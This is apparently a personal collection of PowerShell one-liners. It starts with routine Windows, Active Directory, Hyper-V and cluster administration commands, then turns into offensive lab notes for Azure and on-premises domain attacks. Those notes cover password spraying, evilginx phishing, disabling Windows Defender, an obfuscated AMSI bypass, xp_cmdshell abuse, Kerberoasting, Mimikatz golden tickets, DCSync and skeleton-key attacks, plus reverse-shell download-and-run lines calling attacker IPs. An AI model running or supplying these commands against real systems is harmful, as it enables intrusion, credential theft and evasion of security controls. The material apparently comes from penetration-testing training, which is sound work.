Get-SCVMHost | Get-VM | FT HostName , Name , Owner , CreationTime , OperatingSystem , VirtualMachineState , VMAddition , CPUCount , CPUType , Memory , DiskResources , Location , HasPassthroughDisk , VirtualFibreChannelAdapters -AutoSize -Wrap > InventarioVMSHYPerV.txt
Get-ADComputer AUTOMITE0001 -Properties * | Select name , description , whenCreated , whenChanged
Get-ADComputer ComputerName -Properties * | Select name , description , whenCreated , whenChanged
Get-Command -Noun Variable | Format-Table -Property Name , Definition -AutoSize -Wrap
Test-ComputerSecureChannel -Verbose
Get-WMIObject Win32_LogicalDisk | ft DeviceID , VolumeDirty
Get-ClusterResource "<Cluster Disk Name>" | Get-Parameter | fl DiskRunChkDsk
Get-ClusterResource "<Cluster Disk Name>" | Set-Parameter DiskRunChkDsk = x
Get-WMIObject Win32_Volume | ft Caption , DirtyBitSet -autosize
Get-ClusterSharedVolume | Get-ClusterParameter
Get-ClusterSharedVolume | Set-ClusterParameter DiskRunChkDsk 4
Get-ADComputer -Filter 'Name -like "FileServer*"' -Properties IPv4Address | FT Name , DNSHostName , IPv4Address -A
Get-ADComputer -Filter 'Name -like "*HYP*"' | Select-Object -Property DNSHostName | Sort-Object -Property DNSHostname
Get-WinUserLanguageList
New-NetIPAddress -InterfaceIndex 7 -AddressFamily IPv4 -IPAddress 172.16.0.1
Set-NetIPAddress -InterfaceIndex 7 -AddressFamily IPv4 -IPAddress 172.16.0.2
Get-VIEvent -MaxSamples ( [ int ] :: MaxValue ) | Where-Object { $_ . FullFormattedMessage -like "*AUTNN9*" } | Select-Object -Property CreatedTime , Username , FullFormattedMessage
Get-WmiObject -ComputerName ( Get-Content C:\Temp\listaFindSO.txt ) -Class win32_operatingsystem -ErrorAction SilentlyContinue | Select-Object -Property CSName , Version , Caption | Export-Csv -NoTypeInformation -Path C:\temp\outputso.csv -Append
Get-process | where { $_ . cpu -gt 100 } | select cpu , pm , vm , processname , Id , @{ l = "Owner" ; e = { $owners [ $_ . id . tostring ( ) ] } } | ft -AutoSize
Get-WmiObject Win32_Process -Filter "name='calculator.exe'" |
out-file -filepath "C:\temp\mybackup $(get-date -f yyyy-MM-dd).zip"
Get-WmiObject -Class Win32_OperatingSystem -EnableAllPrivileges
Import-Module -Name Vmware.VimAutomation.Core -Verbose
Get-WindowsDriver –Online -All
https://citrix.github.io/delivery-controller-sdk/
get-item "C:\Windows\System32\qmgr.dll" | Select-Object -ExpandProperty VersionInfo
Get-WmiObject -Class win32_operatingsystem | Select-Object -Property CSName , Caption , @{ LABEL = 'LocalDateTime' ; EXPRESSION = { $_ . ConverttoDateTime ( $_ . LocalDateTime ) } }
Add-PSSnapin VMware.VimAutomation.Core -ErrorAction 'SilentlyContinue'
Get-ADGroup -Identity _Automite_Grp_N3 | Get-ADGroupMember | Select-Object -Property Name , SamAccountName | Sort-Object -Property Name
Get-ADGroup -Identity _Automite_Grp_N3 | Remove-ADGroupMember -Members automiteusr0390 , automiteusr0489 , automiteusr0504
Get-WmiObject Win32_Process -Filter "Name like '%vmwp%'" | Select-Object ProcessId , @{ Label = "VMName" ; Expression = { ( Get-VM -Id $_ . Commandline . split ( " " ) [ 1 ] | Select-Object VMName ) . VMName } } | ft -AutoSize
Get-WmiObject -Class Win32_SoftwareFeature | Select-Object -Property ProductName , Caption , Version | Format-Table
Get-CimClass -ClassName win32* | where { $_ . CimClassMethods } | select CimClassName , CimClassMethods
Get-WmiObject -Class Win32_Volume | Select-Object Label , BlockSize | Format-Table -AutoSize
https://social.technet.microsoft.com/Forums/Azure/en-US/44b4e8aa-f82f-4315-8b07-b9ae2bf45121/exportcsv-mostly-working-but-one-column-displays-systemstring-exchange-tracking-logs?forum=winserverpowershell
https://docs.netapp.com/ontap-9/index.jsp?topic=%2Fcom.netapp.doc.dot-cm-sanmig-fli%2FGUID-1120E516-ED3F-4C00-A43A-C301E45A3A52.html
Get-SCVirtualFibreChannelAdapter | ft Name , PrimaryWorldWideNodeName , PrimaryWorldWidePortName , SecondaryWorldWideNodeName , SecondaryWorldWidePortName
Get-Disk | Select-Object -Property Number , Signature , UniqueID , SerialNumber , FriendlyName , @{ label = 'AllocSize(GB)' ; expression = { '{0:N2}' -f ( $PSItem . AllocatedSize / 1GB ) } } , @{ label = 'Size(GB)' ; expression = { '{0:N2}' -f ( $PSItem . Size / 1GB ) } } | Format-Table -AutoSize -Wrap
New-VHD "C:\ClusterStorage\VMDATA_PURESTORAGE_GOLD_01\DCServer01\DCServer01_DISK_2.vhdx" -SizeBytes 50GB -Fixed -PhysicalSectorSizeBytes 512
Get-Template | Select-Object -Property ID , OperatingSystem , CPUCount , Owner , ObjectType , AddedTime , ModifiedTime , Enabled , @{ label = 'TotalVHDCapacity(MB)' ; expression = { '{0:N2}' -f ( $PSItem . TotalVHDCapacity / 1MB ) } } | Out-File -FilePath .\AllTemplates_SCVMM_LAN.txt
Get-ADComputer -Filter * -Properties * | Select-Object -Property Name , DnsHostName , whenCreated , Description , OperatingSystem , OperatingSystemVersion , Enabled , lastLogonTimestamp , LastLogonDate | Export-CSV AutomiteComputers.csv -NoTypeInformation -Encoding UTF8
get-aduser chad -properties lastlogontimestamp , pwdLastSet | select samaccountname , ` @{ Name = "LastLogonTimeStamp" ; Expression = { ( [ datetime ] :: FromFileTime ( $_ . LastLogonTimeStamp ) ) } } , ` @{ Name = "pwdLastSet" ; Expression = { ( [ datetime ] :: FromFileTime ( $_ . pwdLastSet ) ) } }
Get-WinEvent -LogName Microsoft-Windows-FailoverClustering/Operational | Where-Object -FilterScript { $_ . Message -like "*SERVERNAME-VMS05*" }
Get-WmiObject -Class Win32_Product
Get-VMMManagedComputer | Select-Object -Property Name , AgentVersion | Sort-Object -Property AgentVersion
Get-SCVirtualMachine -Name SERVER-VMS0249 | Set-SCVirtualMachine -EnableTimeSync $False
Get-Service -ComputerName $serverList -Name 'Zabbix Agent' | Select-Object -Property MachineName , DisplayName , Status , StartType
Get-ChildItem env:
Get-ClusterGroup “VM01” | Get-ClusterResource | Set-ClusterParameter OfflineAction 1 #Ativa Quick Migration que por default é desabilitado via Powershell
Get-Cluster -Name AUTOMITESRV002CLU | Get-ClusterGroup -Name "ServerName" | Move-ClusterGroup #Quick Migration da VM - Cuidado!
Move-ClusterGroup -Name "VM01" -Node "HV2" #Quick Migration da VM - Cuidado!
Invoke-Command -ScriptBlock $code -ComputerName $listOfComputers -Throttle 1000
Invoke-Command -ComputerName SERVER-VMM0123 -ScriptBlock { & "C:\Program Files (x86)\winrar\Rar.exe" a -ep -ep1 "C:\temp\gateway\nlog-own-2019-09-07.rar" "C:\temp\gateway\nlog-own-2019-09-07.log" }
Get-ADComputer -Identity "ServerName" -Properties passwordlastset
Import-Module ServerManager
Get-NetAdapter
Send-MailMessage -SmtpServer $smtpserver -From $fromaddress -To $toaddress -Cc $CCaddress -Subject $XenApp65Subject -Attachments $XenApp65Attachment -Body $XenAppBody -BodyAsHtml -Priority Normal -Encoding ( [ System.Text.Encoding ] :: UTF8 )
https://mcpmag.com/articles/2013/08/20/powershell-name-duplicates.aspx
Get-DnsServerResourceRecord -ComputerName automitesrv01 -ZoneName 'br.automite.net' -RRType 'NS' -Node
Invoke-RestMethod http://ipinfo.io/json | Select-Object -ExpandProperty IP
get-adobject -id { guid } | fl
Get-NetTCPConnection | Group-Object -Property State , OwningProcess | Select -Property Count , Name , @{ Name = "ProcessName" ; Expression = { ( Get-Process -PID ( $_ . Name . Split ( ',' ) [ -1 ] . Trim ( ' ' ) ) ) . Name } } , Group | Sort Count -Descending
Get-QADUser seth -IncludeAllProperties | select name , @{ Name = ’proxyAddresses’ ; Expression = { [ string ] :: join ( “;” , ( $_ . proxyAddresses ) ) } } | Export-Csv .seth-all_proxyaddresses.csv
Rename-Computer -ComputerName "AutomiteSRV01" -NewName "AutomiteSRV02" -DomainCredential ( Get-Credential ) -Force -Restart -Verbose
Start-Transcript -Append "$env:SystemDrive\Temp\Log1.txt" #append
Enter-PSSession -ComputerName dc01
New-Item -Path $Profile -Force
Set-CauClusterRole -ClusterName SERVER-VMM0263 -Force -CauPluginName Microsoft.WindowsUpdatePlugin -CauPluginArguments @{ 'IncludeRecommendedUpdates' = 'False' } -MaxRetriesPerNode 3 -RequireAllNodesOnline -RebootTimeoutMinutes 120 -StartDate "01/12/2020 20:00:00" -DaysOfWeek 16 -WeeksOfMonth @( 1 ) -UseDefault -EnableFirewallRules ; Enable-CauClusterRole -ClusterName SERVER-VMM0263 -Force ;
Measure-Command -Expression { .\do_something.ps1 }
get-process | foreach {
Get-Content *.csv | Add-Content output.csv
Invoke-RestMethod http://ipinfo.io/json | Select-Object -ExpandProperty IP
Get-ADOrganizationalUnit -SearchBase "OU=Groups,OU=CHILDOU,OU=BASEOU,DC=yourcompany,DC=com" -Filter * | Set-ADObject -ProtectedFromAccidentalDeletion $false -Confirm: $false -Verbose
Test-Path -Path '\\AUTOMITESRV01\c$\Windows\explorer.exe'
get-childItem -LiteralPath \\?\e:\TopFolders\
get-childItem -LiteralPath \\?\UNC\MyFileServerHostName\Share\
Invoke-RestMethod -Uri "https://dashboarddelivery.nextens.nl/api/invalidate/" -Method Get -UseBasicParsing
Get-SmbMapping
Start-Process -FilePath "$env:windir\regedit.exe" -ArgumentList "/e Myfile2.reg `"HKEY_LOCAL_MACHINE\SOFTWARE\VMware, Inc.`""
Install-WindowsFeature -Name 'Telnet-Client' -Confirm: $false -Verbose
Get-ChildItem -Path *.txt |
Get-Service | Where-Object -FilterScript { $_ . DependentServices -ne $null } | Select-Object -Property Name , DependentServices | Format-Table -AutoSize
Send-MailMessage @SendMailParameters
Set-ADAccountPassword -Identity $UserName -Reset -NewPassword $password [ 1 ]
Send-MailMessage -From $EmailSender -To $AdminEmail -Subject $PWEmailSubject -Body $PWEmailBody -SMTPServer $SMTPServer
New-Object -TypeName PSObject -Property @{
Import-Module ActiveDirectory -ErrorAction Stop
Send-WakeOnLanPacket -MACAddress $mac -IPAddress $broadcastIP
Send-WakeOnLanPacket -MACAddress $mac -IPAddress $ip
Start-ScheduledTask -TaskName $taskName
Get-PackageProvider -Name 'NuGet' -ForceBootstrap | Out-Null
Set-BuildEnvironment -Force
New-Item -Path $StagingFolder -ItemType 'Directory' -Force | Out-String | Write-Verbose
Copy-Item -Path $env:BHPSModuleManifest -Destination $StagingModulePath -Recurse
Import-Module -Name $StagingModulePath -ErrorAction 'Stop' -Force -Global
New-Item -Path $ArtifactFolder -ItemType 'Directory' -Force | Out-String | Write-Verbose
Set-ModuleFunctions -Name $env:BHPSModuleManifest
Get-CMDeployment -CollectionName $CollectionName -FeatureType Application | Remove-CMDeployment -Force
Get-CMDeployment -CollectionName $CollectionName -FeatureType Package | Remove-CMDeployment -Force
pnputil.exe -i -a $driver
Register-ArgumentCompleter -CommandName $Command -ScriptBlock {
New-Item $WslCompletionFunctionsCache -Force | Out-Null
Wait-Script
New-Shortcut -Path "$DesktopPath\PowerShell-Youtube-dl.lnk" -TargetPath ( Get-Command powershell.exe ) . Source -Arguments "-ExecutionPolicy Bypass -File ""$DefaultScriptInstallLocation\bin\youtube-dl-gui.ps1""" -StartPath "$DefaultScriptInstallLocation\bin"
Start-Process "https://github.com/mpb10/PowerShell-Youtube-dl/blob/$DefaultRepositoryBranch/README.md#readme"
Start-Process "https://github.com/ytdl-org/youtube-dl/blob/master/README.md#readme"
Start-Process "https://www.ffmpeg.org/ffmpeg.html"
Uninstall-Script -Path $DefaultScriptInstallLocation
Install-Script -Path $DefaultScriptInstallLocation -Branch $DefaultRepositoryBranch -LocalShortcut -StartMenuShortcut
Get-MainMenu
Start-Sleep -Seconds $Seconds
Get-Download -Url 'http://yt-dl.org/downloads/latest/youtube-dl.exe' -Path $TempFile
Get-Download -Url 'https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip' -Path $TempFile
Expand-Archive -Path $TempFile -DestinationPath $Path
New-Shortcut -Path "$Path\PowerShell-Youtube-dl.lnk" -TargetPath ( Get-Command powershell.exe ) . Source -Arguments "-ExecutionPolicy Bypass -File ""$Path\bin\youtube-dl-gui.ps1""" -StartPath "$Path\bin"
New-Shortcut -Path "$DesktopPath\PowerShell-Youtube-dl.lnk" -TargetPath ( Get-Command powershell.exe ) . Source -Arguments "-ExecutionPolicy Bypass -File ""$Path\bin\youtube-dl-gui.ps1""" -StartPath "$Path\bin"
Join-Path -Path $Path -ChildPath '\'
Get-Content -ErrorAction SilentlyContinue -Path $ProjectList | Foreach {
Get-Content -ErrorAction SilentlyContinue -Path $ChocolateyList | Foreach {
Get-Content -ErrorAction SilentlyContinue -Path $PathList | Foreach {
Get-Content -ErrorAction SilentlyContinue -Path $GemList | Foreach {
Get-Content -ErrorAction SilentlyContinue -Path $ProjectList | Foreach {
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ? { $_ . IdentifyReference -match 'student1' }
Add-ObjectACL -TarggetADSPrefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student1 -Rights All -Verbose
Set-DomainUserPassword -Identity pastudent149 -AccountPassword ( ConvertTo-SecureString "Password!123" -AsPlainText -Force ) -Verbose
Add-ObjectAcl -targetDistinguishedName 'DC=<dc name>,DC=local' -PrincipalSameAccountName pastudent149 -Rights All -Verbose
Get-WmiObject -class win32_operatingsystem -ComputerName < DC>
Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1 -Verbose
Get-AADIntTenantDomains -Domain $domain
C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -f C:\AzAD\Tools\emails.txt -o validemails.txt
Import-Module C:\AzAD\Tools\MicroBurst\MicroBurst.psm1 -Verbose
Import-Module C:\AzAD\Tools\MSOLSpray\MSOLSpray.ps1
Get-AzureADUser
Get-AzureADDirectoryRole | ? { $_ . DisplayName -contains "Application Administrator" }
Get-AzureADDirectoryRoleMember -ObjectId $objectid
Get-AzureADDirectoryRole | ? { $_ . DisplayName -contains "Global Administrator" }
Get-AzureADGroup
Connect-AzAccount -Credential $creds
Connect-AzureAD -Credential $creds
nc.exe -lvp 4444
Add-AzureADGroupMember -ObjectId $automationAdminObjectId -RefObjectId $client_id
Import-AzAutomationRunbook -Name artilleryRed -Path C:\AzAD\Tools\studentx.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
Start-AzAutomationRunbook -RunbookName artilleryRed -RunOn WorkerGroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
Connect-AzAccount -AccessToken $AccessToken -AccountId $client_id
Get-AzPublicIpAddress -Name $ipId
Invoke-AzVMRunCommand -VMName $name -ResourceGroupName $resourceGroup -CommandId 'RunPowerShellScript' -ScriptPath C:\Users\studentuser170\Documents\vmUserAdd.ps1 -Verbose
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
Get-AzureADDirectoryRole -ObjectId 5b3935ed-b52d-4080-8b05-3a1832194d3a
Get-azResource
Get-AzVM -Name jumpvm -ResourceGroupName $resourceGroup | select -ExpandProperty NetworkProfile
Invoke-AzVMRunCommand -ScriptPath C:\AzAD\Tools\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'jumpvm' -ResourceGroupName $resourceGroup -Verbose
Enter-PSSession -Session $jumpvm
Get-AzVMExtension -ResourceGroupName $resourceGroup -VMName "infradminsrv"
Invoke-Command -Session $infravm -ScriptBlock { dsregcmd /status }
Invoke-Command -Session $infravm -ScriptBlock { gc C:\temp\PRT.txt }
Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1 -Verbose
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1 -Verbose
Get-AzureADApplication
Get-AzureADServicePrincipal -All $true | ? { $_ . DisplayName -eq "Finance Management System" }
cmd=powershell iex ( New-Object Net.WebClient ) . downloadstring ( 'http://172.16.151.170:82/Invoke-PowerShellTcp.ps1' ) ; Power -Reverse -IPAddress 172.16.151.170 -Port 4446
Get-AzureADUser -All $true | ? { $_ . userPrincipalName -match "Sync_" }
Import-Module C:\AzAD\Tools\AADInternals\
Get-AADIntUsers | ? { $_ . DirSyncEnabled -ne "True" } | select UserPrincipalName , ObjectID
Get-AzureADUser -All $true
Get-AzureADUser | Get-AzureADUserCreatedObject
Get-AzureADGroup -All $true$
Get-AzureADGroup -SearchString "admin" | fl *
Get-AzureADGroup -All $true | ? { $_ . OnPremisesSecurityIdentifier -ne $null }
Get-AzureADUser -SearchString 'test' | Get-AzureADUserMembership
Get-AzureADDirectoryroleTemplate
Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
Get-AzureADDevice -All $true | fl *
Get-AzureADUserOwnedDevice -ObjectId $objid
Get-AzureADDevice -All $true | ? { $_ . IsCompliant -eq "True" }
Get-AzureADApplication -All $true
Get-AzureADApplication -ObjectId $objid | Get-AzureADApplicationOwner | fl *
Get-AzureADServicePrincipal -All $true
Get-AzureADServicePrincipal -ObjectId $objid | Get-AzureADServicePrincipalOwner | fl *
Import-Module AzureADPreview.psd1
Invoke-EnumerateSubDomains.ps1 -Base $base
Get-AzKeyVault
Invoke-EnumerateAzureBlobs
Invoke-EnumerateAzureBlobs -Base defcorp -Permutations .\perms.txt
Import-Module AzureAD.psd1
Get-AzureADGroupMember -ObjectId $objectId
Add-AzureADGroupMember -ObjectId $objectId -RefObjectId $accountId -Verbose
Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering
Import-AzAutomationRunbook -Name student170 -Path C:\AzAD\Tools\studentx.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
Start-AzAutomationRunbook -Name student170 -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
Get-LocalUser
Get-AzKeyVault
Get-AzKeyVaultSecret -VaultName ResearchKeyVault
Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText
Get-AzResource
Get-AzRoleAssignment -Scope $resourceId
Get-AzRoleAssignment -Scope $resourceId | % { GEt-AzRoleDefinition -name $_ . RoleDefinitionName | select Name , Description , Actions -ExpandProperty actions }
Get-AzADGroup -DisplayName 'VM Admins'
Get-AzADGroupMember -GroupDisplayName 'VM Admins' | select UserPrincipalName
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
Get-AzureADMSAdministrativeUnitMember -Id $id
Get-AzureADMSScopedRoleMembership -Id $id | fl *
Get-AzureADDirectoryRole -ObjectId 5b3935ed-b52d-4080-8b05-3a1832194d3a
Get-AzureADUser -ObjectId ( Get-AzureADMSScopedRoleMembership -Id $id ) . RoleMemberInfo . Id | fl *
evilginx2.exe -p C:\AzAD\Tools\evilginx2\phishlets
Copy-Item C:\Users\studentuser170\.evilginx\crt\ca.crt C:\Users\studentuser170\.evilginx\crt\login.artillery.corp\o365.crt
Disconnect-AzureAD
Get-AzVM -Name jumpvm -ResourceGroupName RESEARCH | fl *
Invoke-AzVMRunCommand -VMName $name -ResourceGroupName $resourceGroup -CommandId 'RunPowerShellScript' -ScriptPath C:\Users\studentuser170\Documents\vmUserAdd.ps1 -Verbose
Get-AzResourceGroup
Save-AzResourceGroupDeploymentTemplate -ResourceGroupName $resourceGroup -DeploymentName $Dep . DeploymentName
Disconnect-AzAccount
Get-AzStorageContainer -Context ( Get-AzStorageAccount -Name $res . Name -ResourceGroupName $res . ResourceGroupName ) . Context
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
Get-AzureADApplication | % { try { Get-AzureADApplicationProxyApplication -ObjectId $_ . ObjectID ; $_ . DisplayName ; $_ . ObjectID } catch { } }
Get-AzureADServicePrincipal -All $true | ? { $_ . DisplayName -eq 'Finance Management System' }
Set-MpPreference -DisableRealtimeMonitoring $true
Open-AADIntOffice365Portal -ImmutableID < id_from_above> -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\Users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
Get-SQLFuzzServerLogin -Instance UFC-SQLDev -Verbose
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Username sa -Password password -Verbose
Invoke-SQLAuditPrivImpersonateLogin -Username sqluser -Password slq@123 -Instance UFC-SQLDev
Invoke-SQLAuditPrivTrustworthy -Instance UFC-SQLDev -Verbose
Invoke-SQLOSCmd -Username sa -Password Password1 -Instance UFC-SQLDev -Command whoami
Create-SQLFileXpDll -OutFile C:\fileserver\xp_calc.dll -Command "calc.exe" -ExportName xp_calc
csc.exe /target:library C:\filepath\cmd_exec.cs
Create-SQLFileCLRDll -ProcedureName "runcmd" -OutFile runcmd -OutDir .
Invoke-Command -ScriptBlock { Set-MpPreference -DisableIOAVProtection $true } -Session $sess
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Find-LocalAdminAccess -Verbose
Get-AADIntLoginInformation -UserName $User
Get-AADIntTenantId -Domain $domain
C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -f C:\AzAD\Tools\emails.txt -o validemails.txt
Import-Module C:\AzAD\Tools\MicroBurst\MicroBurst.psm1 -Verbose
Invoke-EnumerateAzureBlobs -Base $base -Permutations "thisfile.txt"
C:\AzAD\Tools\MSOLSpray\MSOLSpray.ps1 -UserList .\validemails.txt -Password SuperVeryEasytoGuessPAssw0rd!@222 -VErbose #"SuperVeryEasytoGuessPAssw0rd!@111" -Verbose
Import-Module AzureHound.ps1
Invoke-PortScan -StartAddress 192.168.0.2 -EndAddress 192.168.0.5 -ScanPort -Verbose
Import-Module -Name SQLPS
Get-SErvice -Name MSSQL*
Get-SQLInstanceDomain -Verbose | Group-Object DomainAccount
Get-SQLFuzzServerLogin -Verbose -Instance UFC-SQLDev
Invoke-SQLAuditWeakLoginPw -Verbose -Instance UFC-SQLDev
Get-SQLServiceAccountPwHashes -Verbose -TimeOut 2 -CaptureIp 192.168.50.149
Invoke-SQLImpersonateService -Verbose -Instance UFC-SQLDev\UFC-SQLDev
Invoke-SQLEscalatePriv -Verbose -Instance UFC-SQLDev.us.funcorp.local
Invoke-SQLUncPathInjection -Verbose -CaptureIp 192.168.50.149
Get-SQLAuditServerSpec
Invoke-SQLImpersonateService -Verbose -Instance UFC-SQLDev.us.funcorp.local
Invoke-SQLImpersonateService -Verbose -Rev2Self
Invoke-SQLOSCmdOle -Verbose -Command whoami -Instance UFC-SQLDev -Username db1user -Password "password"
Get-SQLQuery -Instance "UFC-SQLDev" -Query "SELECT DISTINCT b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'"
Get-SQLQuery -Instance "UFC-SQLDev" -Query "EXECUTE as LOGIN = 'dbuser'; SELECT IS_SRVROLEMEMBER('sysadmin');"
Get-SQLQuery -Instance "UFC-SQLDev" -Query "EXECUTE as LOGIN = 'dbuser'; EXECUTE as LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin');"
Get-SQLQuery -Instance "UFC-SQLDev" -Query "EXECUTE as LOGIN = 'dbuser'; EXECUTE as LOGIN = 'sa'; EXEC sp_addsrvrolemember 'USFUN\pastudent149','sysadmin';"
Get-SQLQuery -Instance "UFC-SQLDev" -Query "SELECT IS_SRVROLEMEMBER('sysadmin');"
Get-SQLQuery -Instance "UFC-SQLDev" -Query "EXEC sp_configure 'show advanced options',1; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
Get-SQLQuery -Instance "UFC-SQLDev" -Query "EXEC master..xp_cmdshell 'whoami';"
Get-SQLQuery -Instance "UFC-SQLDev" -Query "EXEC master..xp_cmdshell 'dir C:\Temp';"
Get-SQLQuery -Instance "UFC-SQLDev" -Query "SELECT * FROM information_schema.tables;"
Get-SQLServerLinkCrawl -Instance UFC-SQLDev -Verbose
Get-SQLServerLinkCrawl -INstance UFC-SQLDev -Query "exec master..xp_cmdshell 'whoami'" | ft
Get-ChildItem ENV: | ft Key , Value # Any environmental variables cool?
Get-PSDrive | where { $_ . Provider -like "Microsoft.PowerShell.Core\FileSystem" } | ft Name , Root # Connected drives?
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | select "Defaults"
Get-ChildItem -Hidden ~\AppData\Local\Microsoft\Credentials
Get-Process | where { $_ . ProcessName -notlike "svchost" } | ft processname , id
Get-ScheduledTask | where { $_ . TaskPath -notlike "\Microsoft*" } | ft TaskName , TaskPath , State
Set-MpPreference -DisableRealtimeMonitoring $true # Must be admin
Invoke-Command -ScriptBlock { Get-MpPreference }
Invoke-Command -Session $sess -ScriptBlock { Set-ExecutionPolicy bypass ; Set-MpPreference -DisableRealtimeMonitoring $true }
Set-ItemProperty -Path "Registry::HKLM\SOFTWARE\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force
vncpwd.exe $asHex
Get-Childitem –Path C:\ -Include *unattend* , *sysprep* -File -Recurse -ErrorAction SilentlyContinue | where { ( $_ . Name -like "*.xml" -or $_ . Name -like "*.txt" -or $_ . Name -like "*.ini" ) }
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
Get-Process
Get-WEbCredentials
Invoke-Command -Session $sess -ScriptBlock { gci C:\Users\dbadmin\AppData\Roaming\FileZilla }
Invoke-Command -Session $sess -scriptblock { $findDate = Get-Date -Year 2019 -Month 10 -Day 30 }
Copy-Item C:\Users\pastudent149\Documents\Invoke-Mimikatz.ps1 -Destination .\Invoke-Mimikatz.ps1 -FromSession $sessTo149
Invoke-SQLDumpInfo -Verbose -Instance < ComputerName>
Invoke-Command -Session $sesssql -ScriptBlock { Set-ExecutionPolicy bypass ; c ; Set-MpPreference -DisableRealtimeMonitoring $true }
Get-ObjectAcl -SamAccountName sqlreportuser -ResolveGUIDs | select IdentityReference , ObjectDN , ActiveDirectoryRights | Where-Object { $_ . IdentityReference -like "*sqldev*" }
Set-DomainObject -Identity sqlreportuser -SET @{ serviceprincipalname = 'sqlreportuser/funcrop.local' }
Get-DomainSPNTIcket sqlreportuser/funcorp.local | select hash -ExpandProperty hash | out-file .\sqlreportuser-hash.txt
Set-domainObject -Identify sqlreportuser -Clear serviceprincipalname
Get-WSManCredSSP
Enable-WSManCredSSP -Role Client -DelegateComputer USFUN\PA-USER149
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\lsa\Credssp\PolicyDefaults\AllowFreshCredentialsDomain -Name WSMan -Value "WSMAN/*"
Invoke-Command -Credential $cred -ScriptBlock { Enable-WSManCredSSP -Role Server } -ComputerName UFC-JumpSrv
Enter-PSSession -Credential $cred -ComputerName UFC-JumpSrv -Authentication Credssp
Get-SQLServerLinkCrawl -Instance UFC-SQLDev -Query "EXEC master..xp_cmdshell 'powershell invoke-expression(new-object system.net.webclient).downloadString(''http://192.168.50.149/Invoke-PowerShellTcp.ps1'') | powershell '" | select instance , customQuery -ExpandProperty CustomQuery | where { $_ . Instance -like "AC-DBBUSINESS" }
sET-ItEM ( 'V' + 'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [ TYpE ] ( "{1}{0}" -F 'F' , 'rE' ) ) ; ( GeT-VariaBle ( "1Q2U" + "zX" ) -VaL ) . "A`ss`Embly" . "GET`TY`Pe" ( ( "{6}{3}{1}{4}{2}{0}{5}" -f 'Util' , 'A' , 'Amsi' , '.Management.' , 'utomation' , 's' , 'System' ) ) . "g`etf`iElD" ( ( "{0}{2}{1}" -f 'amsi' , 'd' , 'InitFaile' ) , ( "{2}{4}{0}{1}{3}" -f 'Stat' , 'i' , 'NonPubli' , 'c' , 'c,' ) ) . "sE`T`VaLUE" ( ${n`ULl} , ${t`RuE} )
Enter-PSSession -Session $sess
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername < dc or whoever>
Invoke-Mimikatz -Command '" kerberos::golden /user:Administrator /domain:<domain> /sid: <sid of the domain> /krbtgt: <dump hash> /id:500 /groups:512 /ticket # this saves the ticket to a file for later, use ' /ptt' for injecting into the current process /startoffset:0 # When it is available, negative numbers puts it in the past /endin:600 #lifetime, default for AD is 600 minutes /renewmax:10080 # This is default AD setting "'
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid: <sid of the domain> /krbtgt: <dump hash> /id:500 /groups:512 /ptt /startoffset:0 /endin:600 /renewmax:10080"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:usfun\krbtgt"'
Invoke-Mimikatz -Command '" "'
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName DC
Invoke-mimikatz -Command ' "token::elevate" "lsadump::sam" ' -ComputerName domaincontroller
Enter-PSSession -Computername domaincontroller
copy-item mimilib.dll C:\Windows\System32
Invoke-Mimikatz -Command '"misc::memssp"'
Get-WmiObject -Namespace "root" -Class "__Namespace" | select name
Get-WmiObject -Class *bios* -List
Get-WmiObject -Class Win32_BIOS
Get-WmiObject -Class Win32_process -Filter 'Name = "explorer.exe"'
Get-WmiObject -Class Win32_process | Where-Object { $_ . Name -eq "explorer.exe" } # version 2
Get-WmiObject -Query "select * from Win32_process where Name = 'explorer.exe'"
Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntiVirusProduct
Get-WmiObject -Class Win32_OperatingSystem -ComputerName 127.0.0.1 -Credential $cred
Get-WmiObject -Namespace root\default -Class StdRegProv -LIst | select -ExpandProperty Methods
Invoke-WmiMethod -Namespace root\default -Class stdRegProv -Name EnumKey @( $HIVE_HKCU , "software\microsoft\Internet explorer" ) | select -ExpandProperty sNames
Invoke-SessionGopher.ps1
